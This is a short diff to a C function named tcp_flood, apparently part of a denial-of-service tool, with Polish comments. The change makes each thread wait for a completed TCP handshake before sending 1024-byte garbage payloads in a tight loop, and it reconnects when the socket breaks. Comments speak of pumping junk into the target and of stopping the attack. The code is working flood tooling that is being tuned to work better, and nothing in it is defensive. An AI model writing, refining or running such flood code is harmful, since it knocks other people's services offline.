@@ -79,13 +79,13 @@ void *tcp_flood(void *arg) {
         int flag = 1;
         setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(int)); // Wylacza algorytm Nagle'a (pakiety leca instant)
         
-        fcntl(sock, F_SETFL, O_NONBLOCK);
-        connect(sock, (struct sockaddr *)&target, sizeof(target));
-        
-        // Pompujemy śmieci w otwarte gniazdo
-        for(int i = 0; i < 1000; i++) {
-            if(stop_attack) break;
-            send(sock, payload, 1024, MSG_NOSIGNAL);
+        // Czekamy na polaczenie (blokujace) zeby handshake sie udal
+        if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
+            // Pompujemy śmieci w otwarte gniazdo
+            for(int i = 0; i < 1000; i++) {
+                if(stop_attack) break;
+                if(send(sock, payload, 1024, MSG_NOSIGNAL) < 0) break; // Jak rura pęknie, zamykamy i laczymy od nowa
+            }
         }
         close(sock);
     }
